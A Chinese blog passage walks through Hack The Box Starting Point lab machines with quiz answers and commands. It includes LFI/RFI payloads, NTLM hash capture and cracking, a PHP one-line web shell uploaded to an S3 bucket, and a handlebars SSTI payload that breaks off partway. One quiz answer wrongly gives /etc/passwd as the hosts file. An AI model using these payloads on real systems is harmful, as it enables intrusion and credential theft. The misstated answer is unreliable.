<li><p>当使用 gobuster 到 dir bust 时，我们添加什么开关以确保它找到 PHP 页面？：<code>-x php</code></p>
</li>
</ol>
</blockquote>
<h4 id="什么是Gobuster"><a href="#什么是Gobuster" class="headerlink" title="什么是Gobuster"></a>什么是Gobuster</h4><blockquote>
<p>Gobuster是Kali Linux默认安装的一款暴力扫描工具。 它是使用Go语言编写的命令行工具，具备优异的执行效率和并发性能。 该工具支持对子域名和Web目录进行基于字典的暴力扫描。</p>
</blockquote>
<h3 id="过程-5"><a href="#过程-5" class="headerlink" title="过程"></a>过程</h3><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">gobuster dir -w <span class="regexp">/usr/</span>share<span class="regexp">/wordlists/</span>dirb<span class="regexp">/common.txt -u http:/</span><span class="regexp">/10.129.158.233/</span></span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/htb(STARTING-POINT)/image-20230127211339954.png"><img src="/htb(STARTING-POINT)/image-20230127211339954.png" alt="image-20230127211339954"></a></p>
<p>【下面是由于我用的wsl，没用vm，无法启动chrome，于是用curl传post登录数据，没有要求直接弱密码】</p>
<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">curl</span> http://10.129.158.233/admin.php -X POST -d <span class="string">&quot;username=admin&amp;password=adm</span></span><br><span class="line"><span class="string">in&quot;</span></span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/htb(STARTING-POINT)/image-20230127211215675.png"><img src="/htb(STARTING-POINT)/image-20230127211215675.png" alt="image-20230127211215675"></a></p>
<h2 id="Mongod"><a href="#Mongod" class="headerlink" title="*Mongod"></a>*Mongod</h2><h3 id="Tags-6"><a href="#Tags-6" class="headerlink" title="Tags"></a>Tags</h3><blockquote>
<p><code>MongoDB </code></p>
<p><code>渗透测试仪 1 级</code></p>
<p><code>网络</code></p>
<p><code>数据库</code></p>
<p><code>侦察</code></p>
<p><code>配置错误</code></p>
<p><code>匿名/访客访问</code></p>
</blockquote>
<h3 id="知识点-6"><a href="#知识点-6" class="headerlink" title="知识点"></a>知识点</h3><blockquote>
<ol>
<li><p>MongoDB 是什么类型的数据库？： <code>NoSQL</code></p>
</li>
<li><p>与 mongodb-clients 软件包一起安装的 Mongo shell 的命令名称是什么？: <code>mongo</code></p>
</li>
<li><p>用于列出 MongoDB 服务器上存在的所有数据库的命令是什么？: <code>show dbs</code></p>
</li>
<li><p>用于列出数据库中集合的命令是什么？： <code>show collections</code></p>
</li>
<li><p>将名为 flag 的集合中所有文档的内容以易于阅读的格式转储的命令是什么？: <code>db.flag.find().pretty()</code></p>
</li>
</ol>
</blockquote>
<h4 id="什么是MongoDB"><a href="#什么是MongoDB" class="headerlink" title="什么是MongoDB"></a>什么是MongoDB</h4><blockquote>
<p>MongoDB是一个基于分布式文件存储 [1] 的数据库。由<a href="https://baike.baidu.com/item/C%2B%2B?fromModule=lemma_inlink">C++</a>语言编写。旨在为WEB应用提供可扩展的高性能数据存储解决方案。</p>
<p>MongoDB是一个介于<a href="https://baike.baidu.com/item/%E5%85%B3%E7%B3%BB%E6%95%B0%E6%8D%AE%E5%BA%93?fromModule=lemma_inlink">关系数据库</a>和非关系数据库之间的产品，是非关系数据库当中功能最丰富，最像关系数据库的。它支持的数据结构非常松散，是类似<a href="https://baike.baidu.com/item/json?fromModule=lemma_inlink">json</a>的<a href="https://baike.baidu.com/item/bson?fromModule=lemma_inlink">bson</a>格式，因此可以存储比较复杂的数据类型。Mongo最大的特点是它支持的查询语言非常强大，其语法有点类似于面向对象的查询语言，几乎可以实现类似关系数据库单表查询的绝大部分功能，而且还支持对数据建立<a href="https://baike.baidu.com/item/%E7%B4%A2%E5%BC%95?fromModule=lemma_inlink">索引</a>。</p>
</blockquote>
<h3 id="过程-6"><a href="#过程-6" class="headerlink" title="过程"></a>过程</h3><figure class="highlight 1c"><table><tr><td class="code"><pre><span class="line">mongo mongodb:<span class="comment">//10.129.173.130</span></span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/htb(STARTING-POINT)/image-20230129215710939.png"><img src="/htb(STARTING-POINT)/image-20230129215710939.png" alt="image-20230129215710939"></a></p>
<figure class="highlight dart"><table><tr><td class="code"><pre><span class="line"><span class="keyword">show</span> dbs</span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/htb(STARTING-POINT)/image-20230129215752293.png"><img src="/htb(STARTING-POINT)/image-20230129215752293.png" alt="image-20230129215752293"></a></p>
<figure class="highlight actionscript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">use</span> sensitive_information</span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/htb(STARTING-POINT)/image-20230129215912471.png"><img src="/htb(STARTING-POINT)/image-20230129215912471.png" alt="image-20230129215912471"></a></p>
<figure class="highlight dart"><table><tr><td class="code"><pre><span class="line"><span class="keyword">show</span> collections</span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/htb(STARTING-POINT)/image-20230129215847534.png"><img src="/htb(STARTING-POINT)/image-20230129215847534.png" alt="image-20230129215847534"></a></p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">db<span class="selector-class">.flag</span><span class="selector-class">.find</span>()<span class="selector-class">.pretty</span>()</span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/htb(STARTING-POINT)/image-20230129215955916.png"><img src="/htb(STARTING-POINT)/image-20230129215955916.png" alt="image-20230129215955916"></a></p>
<h2 id="Synced"><a href="#Synced" class="headerlink" title="*Synced"></a>*Synced</h2><h3 id="Tags-7"><a href="#Tags-7" class="headerlink" title="Tags"></a>Tags</h3><blockquote>
<p><code>Rsync</code></p>
<p><code>渗透测试仪 1 级</code></p>
<p><code>网络</code></p>
<p><code>协议</code></p>
<p><code>侦察</code></p>
<p><code>匿名/访客访问</code></p>
</blockquote>
<h3 id="知识点-7"><a href="#知识点-7" class="headerlink" title="知识点"></a>知识点</h3><blockquote>
<ol>
<li>rsync 的默认端口是什么？：<code>873</code></li>
<li>Linux 上与 rsync 交互的最常用命令名称是什么？：<code>rsync</code> </li>
<li>您必须向 rsync 传递哪些凭据才能使用匿名身份验证？：<code>None</code>(无)</li>
<li>仅列出 rsync 上的共享和文件的选项是什么？（无需包括前导 – 字符）：<code>list-only</code></li>
</ol>
</blockquote>
<h4 id="什么是rsync"><a href="#什么是rsync" class="headerlink" title="什么是rsync"></a>什么是rsync</h4><blockquote>
<p>rsync是<a href="https://baike.baidu.com/item/linux%E7%B3%BB%E7%BB%9F/1732935?fromModule=lemma_inlink">linux系统</a>下的数据镜像备份工具。使用快速增量备份工具Remote Sync可以远程同步，支持本地复制，或者与其他SSH、rsync主机同步。</p>
<p>已支持跨平台，可以在Windows与Linux间进行数据同步。</p>
</blockquote>
<h3 id="过程-7"><a href="#过程-7" class="headerlink" title="过程"></a>过程</h3><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">rsync</span> --list-only <span class="number">10.129.33.133</span>::</span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/htb(STARTING-POINT)/image-20230129222433250.png"><img src="/htb(STARTING-POINT)/image-20230129222433250.png" alt="image-20230129222433250"></a></p>
<figure class="highlight dns"><table><tr><td class="code"><pre><span class="line">rsync --list-only <span class="number">10.129.33.133</span><span class="number">::</span>public</span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/htb(STARTING-POINT)/image-20230129222509164.png"><img src="/htb(STARTING-POINT)/image-20230129222509164.png" alt="image-20230129222509164"></a></p>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line">rsync <span class="number">10.129</span>.<span class="number">33.133</span><span class="symbol">:</span><span class="symbol">:public/flag</span>.txt flag.txt</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">ls</span></span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/htb(STARTING-POINT)/image-20230129223114091.png"><img src="/htb(STARTING-POINT)/image-20230129223114091.png" alt="image-20230129223114091"></a></p>
<h1 id="第1层"><a href="#第1层" class="headerlink" title="第1层"></a>第1层</h1><h2 id="Appointment"><a href="#Appointment" class="headerlink" title="Appointment"></a>Appointment</h2><h3 id="Tags-8"><a href="#Tags-8" class="headerlink" title="Tags"></a>Tags</h3><blockquote>
<p><code>网络</code></p>
<p><code>数据库</code></p>
<p><code>注入</code></p>
<p><code>Apache</code></p>
<p><code>SQL</code></p>
<p><code>PHP</code></p>
<p><code>数据库</code></p>
<p><code>渗透测试仪 1 级</code></p>
<p><code>侦察</code></p>
<p><code>SQL注入</code></p>
</blockquote>
<h3 id="知识点-8"><a href="#知识点-8" class="headerlink" title="知识点"></a>知识点</h3><blockquote>
<ol>
<li>SQL 的缩写代表什么？：<code>Structured Query Language</code>（结构化查询语言）</li>
<li>最常见的 SQL 漏洞类型之一是什么？：<code>SQL injection</code>（SQL注入）</li>
<li>PII 代表什么？：<code>Personally Identifiable Information</code>（个人身份信息）</li>
<li>此漏洞的 2021 OWASP Top 10 分类是什么？：<code>A03:2021-Injection</code></li>
<li>HTTPS 协议使用的标准端口是什么？：<code>443</code></li>
<li>Web 应用程序术语中的文件夹是什么？：<code>directory</code></li>
<li>“未找到”错误的 HTTP 响应代码是什么？：<code>404</code></li>
<li>如果不小心处理用户输入，它可能会被解释为评论。在不知道密码的情况下使用评论以管理员身份登录。返回的网页上的第一个词是什么？：<code>Congratulations</code></li>
</ol>
</blockquote>
<h2 id="Sequel"><a href="#Sequel" class="headerlink" title="Sequel"></a>Sequel</h2><h3 id="Tags-9"><a href="#Tags-9" class="headerlink" title="Tags"></a>Tags</h3><blockquote>
<p><code>漏洞评估</code></p>
<p><code>数据库</code></p>
<p><code>MySQL</code></p>
<p><code>SQL</code></p>
<p><code>渗透测试仪 1 级</code></p>
<p><code>侦察</code></p>
<p><code>弱凭证</code></p>
</blockquote>
<h3 id="知识点-9"><a href="#知识点-9" class="headerlink" title="知识点"></a>知识点</h3><blockquote>
<ol>
<li>哪个端口为 MySQL 提供服务？：<code>3306</code></li>
<li>使用 MySQL 命令行客户端时，我们需要使用什么开关来指定登录用户名？：<code>-u</code></li>
<li>在 SQL 中，我们可以使用什么符号来在查询中指定我们要显示表中的所有内容？:<code>*</code></li>
</ol>
</blockquote>
<h2 id="Crocodile"><a href="#Crocodile" class="headerlink" title="Crocodile"></a>Crocodile</h2><h3 id="Tags-10"><a href="#Tags-10" class="headerlink" title="Tags"></a>Tags</h3><blockquote>
<p><code>网络</code></p>
<p><code>传统应用</code></p>
<p><code>协议</code></p>
<p><code>Apache</code></p>
<p><code>FTP</code></p>
<p><code>渗透测试仪 1 级</code></p>
<p><code>侦察</code></p>
<p><code>网站结构发现</code></p>
<p><code>明文凭证</code></p>
<p><code>匿名/访客访问</code></p>
</blockquote>
<h3 id="知识点-10"><a href="#知识点-10" class="headerlink" title="知识点"></a>知识点</h3><blockquote>
<ol>
<li>什么 Nmap 扫描开关在扫描期间使用默认脚本？：<code>-sC</code></li>
<li>“允许匿名 FTP 登录”消息返回给我们的 FTP 代码是什么？：<code>230</code></li>
<li>使用 ftp 客户端连接到 FTP 服务器后，当提示匿名登录时，我们提供什么用户名？：<code>anonymous</code></li>
<li>匿名连接到FTP服务器后，我们可以使用什么命令来下载我们在FTP服务器上找到的文件呢？：<code>get</code></li>
<li>我们可以使用 Gobuster 的什么开关来指定我们正在寻找特定的文件类型：<code>-x</code></li>
</ol>
</blockquote>
<h3 id="过程-8"><a href="#过程-8" class="headerlink" title="过程"></a>过程</h3><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">ftp</span> <span class="number">10.129.33.176</span></span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/htb(STARTING-POINT)/image-20230130000838109.png"><img src="/htb(STARTING-POINT)/image-20230130000838109.png" alt="image-20230130000838109"></a></p>
<p><a data-fancybox="gallery" data-src="/htb(STARTING-POINT)/image-20230130000857706.png"><img src="/htb(STARTING-POINT)/image-20230130000857706.png" alt="image-20230130000857706"></a></p>
<p>扫描找到登录页面</p>
<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">dirsearch</span> -u <span class="number">10.129.33.176</span></span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/htb(STARTING-POINT)/image-20230130002433765.png"><img src="/htb(STARTING-POINT)/image-20230130002433765.png" alt="image-20230130002433765"></a></p>
<p>然后抓包字典爆破得到账号密码，登录得到flag</p>
<p><a data-fancybox="gallery" data-src="/htb(STARTING-POINT)/image-20230130003936082.png"><img src="/htb(STARTING-POINT)/image-20230130003936082.png" alt="image-20230130003936082"></a></p>
<h2 id="Responder"><a href="#Responder" class="headerlink" title="Responder"></a>Responder</h2><h3 id="Tags-11"><a href="#Tags-11" class="headerlink" title="Tags"></a>Tags</h3><blockquote>
<p><code>WinRM</code></p>
<p><code>网络</code></p>
<p><code>传统应用</code></p>
<p><code>协议</code></p>
<p><code>XAMPP</code></p>
<p><code>SMB</code></p>
<p><code>Responder</code></p>
<p><code>PHP</code></p>
<p><code>渗透测试仪 1 级</code></p>
<p><code>侦察</code></p>
<p><code>密码破解</code></p>
<p><code>哈希捕获</code></p>
<p><code>远程文件包含</code></p>
<p><code>远程代码执行</code></p>
</blockquote>
<h3 id="知识点-11"><a href="#知识点-11" class="headerlink" title="知识点"></a>知识点</h3><blockquote>
<ol>
<li>用于加载网页不同语言版本的 URL 参数的名称是什么？:<code>page</code></li>
<li>page 参数的以下哪些值是利用本地文件包含 (LFI) 漏洞的示例:<code>../../../../../../../../windows/system32/drivers/etc/hosts</code></li>
<li>page 参数的以下哪些值是利用远程文件包含 (RFI) 漏洞的示例：<code>//10.10.14.6/somefile</code></li>
<li>NTLM 代表什么？:<code>New Technology LAN Manager</code></li>
<li>在 Responder 实用程序中使用哪个标志来指定网络接口？：<code>-i</code></li>
<li>有几种工具可以接受 NetNTLMv2 质询&#x2F;响应并尝试数百万个密码以查看其中是否有任何一个生成相同的响应。一种这样的工具通常被称为 <code>john</code>，但全名是什么？：<code>John the Ripper</code></li>
</ol>
</blockquote>
<h4 id="什么是smb？"><a href="#什么是smb？" class="headerlink" title="什么是smb？"></a>什么是smb？</h4><blockquote>
<p><em>SMB</em>(全称是Server Message Block)是一个网络协议名，它能被用于Web连接和客户端与服务器之间的信息沟通。</p>
</blockquote>
<h4 id="什么是WinRM？"><a href="#什么是WinRM？" class="headerlink" title="什么是WinRM？"></a>什么是WinRM？</h4><blockquote>
<p><strong>WinRM</strong>（<strong>Windows 远程管理</strong>，<strong>Windows Remote Management</strong>）是<a href="https://zh.m.wikipedia.org/wiki/WEB%E6%9C%8D%E5%8A%A1%E7%AE%A1%E7%90%86">WEB服务管理</a>于<a href="https://zh.m.wikipedia.org/wiki/%E5%BE%AE%E8%BD%AF">微软</a>的<a href="https://zh.m.wikipedia.org/wiki/Microsoft_Windows">Microsoft Windows</a>中的<a href="https://zh.m.wikipedia.org/wiki/%E5%AF%A6%E7%8F%BE">实现</a>，它允许处于一个共同<a href="https://zh.m.wikipedia.org/wiki/%E7%B6%B2%E7%B5%A1">网络</a>内的<a href="https://zh.m.wikipedia.org/wiki/Microsoft_Windows">Microsoft Windows</a>计算机彼此之间互相访问和交换信息。在一台机器启用WinRM后，另一台机器就能通过<a href="https://zh.m.wikipedia.org/wiki/Windows_PowerShell">Windows PowerShell</a>对开启WinRM的机器进行<a href="https://zh.m.wikipedia.org/wiki/%E8%BF%9C%E7%A8%8B%E7%AE%A1%E7%90%86">远程管理</a></p>
</blockquote>
<h4 id="什么是XAMPP？"><a href="#什么是XAMPP？" class="headerlink" title="什么是XAMPP？"></a>什么是XAMPP？</h4><blockquote>
<p>XAMPP（<a href="https://baike.baidu.com/item/Apache/6265">Apache</a>+MySQL+<a href="https://baike.baidu.com/item/PHP/9337">PHP</a>+PERL）是一个功能强大的建站集成<a href="https://baike.baidu.com/item/%E8%BD%AF%E4%BB%B6%E5%8C%85/10508451">软件包</a>。这个软件包原来的名字是 LAMPP，但是为了避免误解，最新的几个版本就改名为 XAMPP 了。它可以在Windows、<a href="https://baike.baidu.com/item/Linux/27050">Linux</a>、<a href="https://baike.baidu.com/item/Solaris/3517">Solaris</a>、[Mac OS X](<a href="https://baike.baidu.com/item/Mac">https://baike.baidu.com/item/Mac</a> OS X&#x2F;470629) 等多种操作系统下安装使用，支持多语言：英文、简体中文、<a href="https://baike.baidu.com/item/%E7%B9%81%E4%BD%93%E4%B8%AD%E6%96%87/2677789">繁体中文</a>、<a href="https://baike.baidu.com/item/%E9%9F%A9%E6%96%87/20585">韩文</a>、<a href="https://baike.baidu.com/item/%E4%BF%84%E6%96%87/5491693">俄文</a>、日文等。</p>
</blockquote>
<h4 id="什么是NTLM？"><a href="#什么是NTLM？" class="headerlink" title="什么是NTLM？"></a>什么是NTLM？</h4><blockquote>
<p>NTLM是Windows 新技术 LAN 管理器(NTLM) 是 Microsoft 提供的一套安全协议，用于验证用户身份并保护其活动的完整性和机密性。</p>
<p>指telnet 的一种<code>验证身份方式</code>，即问询&#x2F;应答身份验证协议，是Windows NT 早期版本的标准安全协议，Windows 2000 支持NTLM 是为了保持向后兼容。 Windows 2000内置三种基本安全协议之一。</p>
</blockquote>
<h4 id="什么是Responder？"><a href="#什么是Responder？" class="headerlink" title="什么是Responder？"></a>什么是Responder？</h4><blockquote>
<p>Responder就是这样一种<code>利用身份认证协议，监听获取口令哈希</code>的工具。 如果<strong>客户端&#x2F;目标无法通过DNS域名解析，则会回退到LLMNR（在Windows Vista中引入）和NBT-NS进行解析</strong>。 <code>LLMNR</code>（链路本地多播名称解析）：多播方式查找网络上的主机，其它主机响应IP，然后连接。</p>
</blockquote>
<h4 id="什么是evil-winrm？"><a href="#什么是evil-winrm？" class="headerlink" title="什么是evil-winrm？"></a>什么是evil-winrm？</h4><blockquote>
<p>evil-winrm是<code>Windows</code>远程管理(WinRM) Shell的终极版本。 Windows远程管理是“WS 管理协议的Microsoft 实施，该协议是基于标准SOAP、不受防火墙影响的协议，允许不同供应商的硬件和操作系统相互操作。</p>
</blockquote>
<h3 id="过程-9"><a href="#过程-9" class="headerlink" title="过程"></a>过程</h3><p>启动<code>responder</code>并指定<strong>监听</strong>本地的<code>tun0</code>网卡，</p>
<p>然后由于靶机存在<code>RFI</code>，因此可以远程访问本地的某个文件，使用<code>responder</code>拿到主机的<code>administrator</code>的<strong>哈希</strong>，然后使用<code>john</code>破解。</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line">responder -<span class="selector-tag">I</span> tun0</span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/htb(STARTING-POINT)/image-20230130222039665.png"><img src="/htb(STARTING-POINT)/image-20230130222039665.png" alt="image-20230130222039665"></a></p>
<blockquote>
<p>访问<code>http://unika.htb/index.php?page=//10.10.16.28/somefile</code></p>
<p>[需要先修改<code>hosts</code>文件，把重定向ip修改到对应域名]</p>
<p>这里ip为本地tun0网卡ip</p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/htb(STARTING-POINT)/image-20230130225041057.png"><img src="/htb(STARTING-POINT)/image-20230130225041057.png" alt="image-20230130225041057"></a></p>
<p><a data-fancybox="gallery" data-src="/htb(STARTING-POINT)/image-20230130225118212.png"><img src="/htb(STARTING-POINT)/image-20230130225118212.png" alt="image-20230130225118212"></a></p>
<figure class="highlight arcade"><table><tr><td class="code"><pre><span class="line">john -t <span class="built_in">hash</span>.txt</span><br></pre></td></tr></table></figure>

<p>得到密码</p>
<p>evil-winrm登录</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line">evil-winrm -<span class="selector-tag">i</span> <span class="number">10.129</span>.<span class="number">198.112</span> -u Administrator -<span class="selector-tag">p</span> badminton</span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/htb(STARTING-POINT)/image-20230130232209879.png"><img src="/htb(STARTING-POINT)/image-20230130232209879.png" alt="image-20230130232209879"></a></p>
<p><code>flag</code>在<code>mike</code>用户的<code>Desktop</code>目录中</p>
<h2 id="Three"><a href="#Three" class="headerlink" title="Three"></a>Three</h2><h3 id="Tags-12"><a href="#Tags-12" class="headerlink" title="Tags"></a>Tags</h3><blockquote>
<p><code>网络</code></p>
<p><code>Cloud</code></p>
<p><code>传统应用</code></p>
<p><code>AWS</code></p>
<p><code>渗透测试仪 1 级</code></p>
<p><code>侦察</code></p>
<p><code>网站结构发现</code></p>
<p><code>桶枚举</code></p>
<p><code>任意文件上传</code></p>
<p><code>匿名/访客访问</code></p>
</blockquote>
<h3 id="知识点-12"><a href="#知识点-12" class="headerlink" title="知识点"></a>知识点</h3><blockquote>
<ol>
<li>哪个命令行实用程序可用于与在已发现的子域上运行的服务进行交互？：<code>awscli</code></li>
<li>哪个命令用于设置 AWS CLI 安装？：<code>aws configure</code></li>
<li>上述实用程序用于列出所有 S3 存储桶的命令是什么？：<code>aws s3 ls</code></li>
</ol>
</blockquote>
<h4 id="什么是aws？"><a href="#什么是aws？" class="headerlink" title="什么是aws？"></a>什么是aws？</h4><blockquote>
<p>亚马逊<code>AWS（Amazon Web Services (AWS) ）</code>是亚马逊提供的<code>是全球最全面、应用最广泛的云平台</code>，从全球数据中心提供超过 200 项功能齐全的服务。数百万客户(包括增<code>长最快速的初创公司、最大型企业和主要的政府机构)都在使用 AWS</code> 来降低成本、提高敏捷性并加速创新。</p>
</blockquote>
<h4 id="什么是awscli？"><a href="#什么是awscli？" class="headerlink" title="什么是awscli？"></a>什么是awscli？</h4><blockquote>
<p><code>AWS 命令行界面（AWS CLI）</code>是用于管理AWS 产品的统一工具。 只需要下载和配置一个工具，您就可以使用命令行控制多个AWS 产品并<code>利用脚本</code>来自动执行这些服务</p>
</blockquote>
<h4 id="什么是-Amazon-S3？"><a href="#什么是-Amazon-S3？" class="headerlink" title="什么是 Amazon S3？"></a>什么是 Amazon S3？</h4><blockquote>
<p>Amazon Simple Storage Service（Amazon S3）是一种<code>对象存储服务</code>，提供行业领先的可扩展性、数据可用性、安全性和性能。各种规模和行业的客户都可以使用 Amazon S3 存储和保护任意数量的数据，<code>用于数据湖、网站、移动应用程序、备份和恢复、归档、企业应用程序、IoT 设备和大数据分析</code>。Amazon S3 提供了管理功能，使您可以优化、组织和配置对数据的访问，以满足您的特定业务、组织和合规性要求。</p>
</blockquote>
<h4 id="什么是Bucket-Enumeration-存储桶枚举-？"><a href="#什么是Bucket-Enumeration-存储桶枚举-？" class="headerlink" title="什么是Bucket Enumeration(存储桶枚举)？"></a>什么是Bucket Enumeration(存储桶枚举)？</h4><blockquote>
<p><code>S3 存储桶枚举</code>是查询 S3 存储桶和这些存储桶中的对象的过程。这可以使用不同的 AWS API 调用来完成，例如列出存储桶、获取存储桶内容或 ListObjects。此过程旨在确定给定存储桶中存在哪些 S3 对象。您可以使用此信息来帮助您更好地了解您的数据资源，并就如何最好地管理它做出决定。</p>
</blockquote>
<h3 id="过程-10"><a href="#过程-10" class="headerlink" title="过程"></a>过程</h3><p><code>gobuster</code>爆破子域名</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">gobuster vhost -w <span class="regexp">/usr/</span>share<span class="regexp">/wordlists/</span>subdomains-top1million-<span class="number">5000</span>.txt -u http:<span class="regexp">//</span>thetoppers.htb</span><br></pre></td></tr></table></figure>

<p>列出该<code>s3存储桶</code>下的内容</p>
<figure class="highlight jboss-cli"><table><tr><td class="code"><pre><span class="line">aws s3 <span class="keyword">ls</span> <span class="params">--endpoint=http</span>:<span class="string">//s3.thetoppers.htb/</span> s3:<span class="string">//thetoppers.htb</span></span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/htb(STARTING-POINT)/image-20230131004300879.png"><img src="/htb(STARTING-POINT)/image-20230131004300879.png" alt="image-20230131004300879"></a></p>
<p>本地写一个<code>一句话木马脚本</code></p>
<figure class="highlight php-template"><table><tr><td class="code"><pre><span class="line"><span class="language-xml">echo &#x27;</span><span class="language-php"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="variable">$_GET</span>[<span class="string">&quot;cmd&quot;</span>]);<span class="meta">?&gt;</span></span><span class="language-xml">&#x27; &gt; shell.php </span></span><br></pre></td></tr></table></figure>

<p>上传本地一句话木马到s3存储桶</p>
<figure class="highlight armasm"><table><tr><td class="code"><pre><span class="line"><span class="symbol">aws</span> <span class="built_in">s3</span> <span class="meta">cp</span> shell.php --endpoint<span class="symbol">=http</span>:<span class="comment">//s3.thetoppers.htb/ s3://thetoppers.htb </span></span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/htb(STARTING-POINT)/image-20230131004712717.png"><img src="/htb(STARTING-POINT)/image-20230131004712717.png" alt="image-20230131004712717"></a></p>
<p>访问看看是否成功</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl http://thetoppers.htb/shell.php?cmd=<span class="built_in">ls</span></span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/htb(STARTING-POINT)/image-20230131004810309.png"><img src="/htb(STARTING-POINT)/image-20230131004810309.png" alt="image-20230131004810309"></a></p>
<p>然后蚁剑连接也行，但htb的vpn不走主机连不上</p>
<p>所以可以利用nc反弹shell，也可以直接利用脚本在进行命令执行读取flag</p>
<p><a data-fancybox="gallery" data-src="/htb(STARTING-POINT)/image-20230131005440119.png"><img src="/htb(STARTING-POINT)/image-20230131005440119.png" alt="image-20230131005440119"></a></p>
<h2 id="Ignition"><a href="#Ignition" class="headerlink" title="Ignition"></a>Ignition</h2><h3 id="Tags-13"><a href="#Tags-13" class="headerlink" title="Tags"></a>Tags</h3><blockquote>
<p><code>web</code></p>
<p><code>常见应用</code></p>
<p><code>Magento</code></p>
<p><code>渗透测试员 1 级</code></p>
<p><code>侦察</code></p>
<p><code>网站结构发现</code></p>
<p><code>弱凭据</code></p>
</blockquote>
<h3 id="知识点-13"><a href="#知识点-13" class="headerlink" title="知识点"></a>知识点</h3><blockquote>
<ol>
<li>Linux 计算机上保存域名到 IP 地址对的本地列表的文件的完整路径是什么？:<code>/etc/passwd</code></li>
<li>查找Magento的密码要求，并尝试搜索2023年最常见的密码。哪个密码可以访问管理员帐户？:<code>qwerty123</code></li>
</ol>
</blockquote>
<h4 id="Magento是什么"><a href="#Magento是什么" class="headerlink" title="Magento是什么"></a>Magento是什么</h4><blockquote>
<p><strong>Magento</strong>是<strong>Adobe</strong>公司旗下一个功能丰富的<strong>专业开源电子商务解决方案</strong>，为商家提供一个外观、内容和功能的完全灵活控制。Magento直观的管理界面包含强大的<strong>营销、商品推销和内容管理工具</strong>，使商家能够创建适合其独特业务需求的站点。Magento号称<strong>宇宙最强企业终极电子商务解决方案</strong></p>
</blockquote>
<h4 id="2023年排名前十的密码"><a href="#2023年排名前十的密码" class="headerlink" title="2023年排名前十的密码"></a>2023年排名前十的密码</h4><blockquote>
<ol>
<li><code>123456</code></li>
<li><code>123456789</code></li>
<li><code>qwerty</code></li>
<li><code>password</code></li>
<li><code>12345</code></li>
<li><code>qwerty123</code></li>
<li><code>1q2w3e</code></li>
<li><code>12345678</code></li>
<li><code>111111</code></li>
<li><code>1234567890</code></li>
</ol>
</blockquote>
<h2 id="Bike"><a href="#Bike" class="headerlink" title="*Bike"></a>*Bike</h2><h3 id="Tags-14"><a href="#Tags-14" class="headerlink" title="Tags"></a>Tags</h3><blockquote>
<p>Javascript</p>
<p>Web</p>
<p>Injection</p>
<p>Custom Applications</p>
<p>NodeJS</p>
<p>Penetration Tester Level 1</p>
<p>侦察</p>
<p>远程代码执行</p>
<p>服务器端模板注入 （SSTI）</p>
</blockquote>
<h3 id="知识点-14"><a href="#知识点-14" class="headerlink" title="知识点"></a>知识点</h3><blockquote>
<ol>
<li><p>Node.JS 中使用的模板引擎是什么？:<code>handlebars</code></p>
</li>
<li><p>为了在 HTTP 请求中发送有效负载中的特殊字符，我们将对有效负载进行编码。我们使用什么类型的编码？:<code>URL</code></p>
</li>
<li><p>当我们使用来自 HackTricks 的有效负载来尝试运行系统命令时，我们会收到错误。响应错误中的“未定义”是什么？:<code>require</code></p>
</li>
<li><p>Node.JS 中顶级作用域的名称是什么变量？:<code>Global</code></p>
</li>
<li><p>通过利用此漏洞，我们以运行 Web 服务器的用户身份执行命令。该用户的名称是什么？:<code>root</code></p>
</li>
</ol>
</blockquote>
<h3 id="过程-11"><a href="#过程-11" class="headerlink" title="过程"></a>过程</h3><p>先在HackTricks查看handlebars模板引擎注入payload模板</p>
<figure class="highlight handlebars"><table><tr><td class="code"><pre><span class="line"><span class="template-tag">&#123;&#123;#<span class="name"><span class="built_in">with</span></span> <span class="string">&quot;s&quot;</span> <span class="keyword">as</span> |string|&#125;&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">  </span><span class="template-tag">&#123;&#123;#<span class="name"><span class="built_in">with</span></span> <span class="string">&quot;e&quot;</span>&#125;&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">    </span><span class="template-tag">&#123;&#123;#<span class="name"><span class="built_in">with</span></span> split <span class="keyword">as</span> |conslist|&#125;&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">      </span><span class="template-variable">&#123;&#123;<span class="name">this.pop</span>&#125;&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">      </span><span class="template-variable">&#123;&#123;<span class="name">this.push</span> (<span class="name"><span class="built_in">lookup</span></span> string.sub <span class="string">&quot;constructor&quot;</span>)&#125;&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">      </span><span class="template-variable">&#123;&#123;<span 